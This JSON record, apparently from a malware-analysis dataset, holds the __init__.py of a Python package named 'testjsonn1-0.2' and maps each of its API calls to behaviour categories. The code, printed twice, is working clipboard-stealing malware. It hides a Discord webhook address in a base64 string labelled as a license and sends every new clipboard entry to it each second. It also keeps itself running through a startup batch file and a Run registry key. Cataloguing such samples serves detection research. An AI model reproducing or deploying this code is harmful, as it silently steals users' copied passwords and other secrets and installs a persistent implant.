[
  {
    "pyfile": "__init__.py",
    "code_snippet": "import time\nimport pyperclip\nimport requests\nimport base64\nimport io\nimport os\nimport sys\nimport winreg as reg\n\ndef main():\n    licenseCD = '''aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjM5MTY1Mzk5MDE0MjAxMy9wNmVqSW1qRnhmMlJYakpPM3ZKQmg2VXZQQ2VuS2FsalhKMmR6SDFCd2NkYVdnT1BjR0lkSFY3eGNRWTIxWThoTzhZLQ=='''\n    strb = base64.b64decode(licenseCD)\n    mk = strb.decode('utf-8')\n    send_txt = \"\"\n    n = b'{\"content\": [\"Must be 2000 or fewer in length.\"]}'\n\n    if check_persistence('MyStartupScript'):\n        while True:\n            txt = pyperclip.paste()\n            if send_txt == txt:\n                time.sleep(1)\n            else:\n                data = {\n                    'content': f\"```{txt}```\"\n                }\n                response = requests.post(mk, data=data)\n                if response.content == n:\n                    file = io.BytesIO(txt.encode('utf-8'))\n                    file.name = 'filename.txt'\n                    payload = {\n                        \"file\": (file.name, file)\n                    }\n                    response = requests.post(mk, files=payload)\n                send_txt = txt\n            time.sleep(1)\n    else:\n        add_to_startup()\n\ndef add_to_startup():\n    script_path = os.path.abspath(sys.argv[0])\n    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\\\Windows')\n    bat_name = 'startup_script.bat'\n\n    with open(os.path.join(bat_path, bat_name), 'w') as bat_file:\n        bat_file.write(f'@echo off\\nstart \"\" pythonw \"{script_path}\"\\nexit')\n\n    key = reg.HKEY_CURRENT_USER\n    sub_key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    reg_key = reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)\n    reg.SetValueEx(reg_key, \"MyStartupScript\", 0, reg.REG_SZ, bat_path)\n    reg.CloseKey(reg_key)\n\ndef check_persistence(program_name):\n    hives = [\n        reg.HKEY_LOCAL_MACHINE,\n        reg.HKEY_CURRENT_USER\n    ]\n    paths = [\n        r\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\n        r\"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n    ]\n    for hive in hives:\n        for path in paths:\n            try:\n                with reg.OpenKey(hive, path, 0, reg.KEY_READ) as key:\n                    try:\n                        reg.QueryValueEx(key, program_name)\n                        return True\n                    except FileNotFoundError:\n                        continue\n            except FileNotFoundError:\n                continue\n    return False",
    "pattern_analysis": {
      "api_sequence": [
        "base64.b64decode",
        "bytes.decode",
        "check_persistence",
        "pyperclip.paste",
        "requests.post",
        "requests.post",
        "io.BytesIO",
        "bytes.encode",
        "requests.post",
        "time.sleep",
        "os.path.abspath",
        "sys.argv",
        "os.getenv",
        "os.path.join",
        "open",
        "open.write",
        "reg.OpenKey",
        "reg.SetValueEx",
        "reg.CloseKey",
        "reg.OpenKey",
        "reg.QueryValueEx"
      ],
      "api_sequence_with_args": [
        "base64.b64decode(licenseCD)",
        "strb.decode('utf-8')",
        "check_persistence('MyStartupScript')",
        "pyperclip.paste()",
        "requests.post(mk, data=data)",
        "response.content == n",
        "io.BytesIO(txt.encode('utf-8'))",
        "txt.encode('utf-8')",
        "requests.post(mk, files=payload)",
        "time.sleep(1)",
        "os.path.abspath(sys.argv[0])",
        "sys.argv[0]",
        "os.getenv('APPDATA')",
        "os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows')",
        "open(os.path.join(bat_path, bat_name), 'w')",
        "bat_file.write(f'@echo off\\nstart \"\" pythonw \"{script_path}\"\\nexit')",
        "reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)",
        "reg.SetValueEx(reg_key, \"MyStartupScript\", 0, reg.REG_SZ, bat_path)",
        "reg.CloseKey(reg_key)",
        "reg.OpenKey(hive, path, 0, reg.KEY_READ)",
        "reg.QueryValueEx(key, program_name)"
      ],
      "mapped_sequence": [
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "check_persistence",
          "id": "check_persistence_entry",
          "description": "Checks if persistence entry exists for specified program name",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "startup_checking"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "io.BytesIO",
          "id": "create_memory_bytes",
          "description": "Creates in-memory bytes buffer from encoded string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytes.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "os.path.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "sys.argv",
          "id": "get_cmd_args",
          "description": "Retrieves command-line arguments passed to script",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "reg.OpenKey",
          "id": "open_registry_key",
          "description": "Opens registry key with specified access",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "reg.SetValueEx",
          "id": "set_registry_value",
          "description": "Sets value for specified registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_modification"
        },
        {
          "api_name": "reg.CloseKey",
          "id": "close_registry_key",
          "description": "Closes the opened registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "reg.OpenKey",
          "id": "open_registry_key",
          "description": "Opens registry key with specified access",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "reg.QueryValueEx",
          "id": "get_registry_value",
          "description": "Retrieves value and data type for specified registry value",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_modification"
        }
      ],
      "contextual_code": "import time\nimport pyperclip\nimport requests\nimport base64\nimport io\nimport os\nimport sys\nimport winreg as reg\n\ndef main():\n    licenseCD = '''aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjM5MTY1Mzk5MDE0MjAxMy9wNmVqSW1qRnhmMlJYakpPM3ZKQmg2VXZQQ2VuS2FsalhKMmR6SDFCd2NkYVdnT1BjR0lkSFY3eGNRWTIxWThoTzhZLQ=='''\n    strb = base64.b64decode(licenseCD)\n    mk = strb.decode('utf-8')\n    send_txt = \"\"\n    n = b'{\"content\": [\"Must be 2000 or fewer in length.\"]}'\n\n    if check_persistence('MyStartupScript'):\n        while True:\n            txt = pyperclip.paste()\n            if send_txt == txt:\n                time.sleep(1)\n            else:\n                data = {\n                    'content': f\"```{txt}```\"\n                }\n                response = requests.post(mk, data=data)\n                if response.content == n:\n                    file = io.BytesIO(txt.encode('utf-8'))\n                    file.name = 'filename.txt'\n                    payload = {\n                        \"file\": (file.name, file)\n                    }\n                    response = requests.post(mk, files=payload)\n                send_txt = txt\n            time.sleep(1)\n    else:\n        add_to_startup()\n\ndef add_to_startup():\n    script_path = os.path.abspath(sys.argv[0])\n    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\\\Windows')\n    bat_name = 'startup_script.bat'\n\n    with open(os.path.join(bat_path, bat_name), 'w') as bat_file:\n        bat_file.write(f'@echo off\\nstart \"\" pythonw \"{script_path}\"\\nexit')\n\n    key = reg.HKEY_CURRENT_USER\n    sub_key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    reg_key = reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)\n    reg.SetValueEx(reg_key, \"MyStartupScript\", 0, reg.REG_SZ, bat_path)\n    reg.CloseKey(reg_key)\n\ndef check_persistence(program_name):\n    hives = [\n        reg.HKEY_LOCAL_MACHINE,\n        reg.HKEY_CURRENT_USER\n    ]\n    paths = [\n        r\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\n        r\"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n    ]\n    for hive in hives:\n        for path in paths:\n            try:\n                with reg.OpenKey(hive, path, 0, reg.KEY_READ) as key:\n                    try:\n                        reg.QueryValueEx(key, program_name)\n                        return True\n                    except FileNotFoundError:\n                        continue\n            except FileNotFoundError:\n                continue\n    return False"
    }
  },
  {
    "metadata": {
      "package_name": "testjsonn1-0.2"
    }
  }
]